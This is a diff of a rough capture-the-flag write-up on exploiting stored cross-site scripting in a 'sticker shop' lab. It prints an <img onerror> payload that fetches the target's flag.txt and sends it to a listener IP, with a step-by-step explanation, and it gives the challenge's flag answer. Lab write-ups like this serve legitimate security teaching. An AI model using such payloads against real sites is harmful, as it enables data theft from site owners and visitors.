@@ -1,5 +1,7 @@
 ROUGH WRITEUP NOT COMPLETE
 
+![image](https://github.com/user-attachments/assets/c3a16a82-63e5-4467-b055-282e5a2316d5)
+
 This CTF is designed around exploiting a cross-site scripitng vulnerablility within the target's website.
 
 ## The sticker shop is finally online!
@@ -32,10 +34,18 @@ All together, the text box is fet a request to open an image that doesnt exist, 
 
 ![image](https://github.com/user-attachments/assets/da4d8e2a-32b4-43d0-8f0c-07709ef530b5)
 
-Knowing this information, I basically fed the question to chatgpt and it provideed me a lovely crafted response with additional lines added onto the initial injected code as seen below:
+Knowing this information, I basically fed the question to chatgpt and it provided me a lovely crafted response with additional lines added onto the initial injected code as seen below:
 
-<img src=x onerror="fetch('http://10.10.100.188:8080/flag.txt').then(response => response.text()).then(data => fetch('http://10.10.239.245:8080/?flag=' + encodeURIComponent(data)))" />
+<img src="x" onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(r => fetch('http://10.10.239.245:8080/?c=' + r))"/>
 
 This is very similar to the previous injection, but this time taking data from http:IP_ADDR/flag.txt instead. This would work using this method but not when searched on my own device as this is the website doing a lookup for its own material, therefore it will always have access to it. 
 
+This works as Follows:
 
+.then(r => r.text()) = This converts the response to text
+
+.then(r => fetch('http://10.11.116.53:8080/?c=' + r)) = This sends the converted response to the attacker IP who is listening
+
+![image](https://github.com/user-attachments/assets/33c82a30-a34c-49fa-bef4-8f333bb41509)
+
+``` Answer = THM{83789a69074f636f64a38879cfcabe8b62305ee6} ```
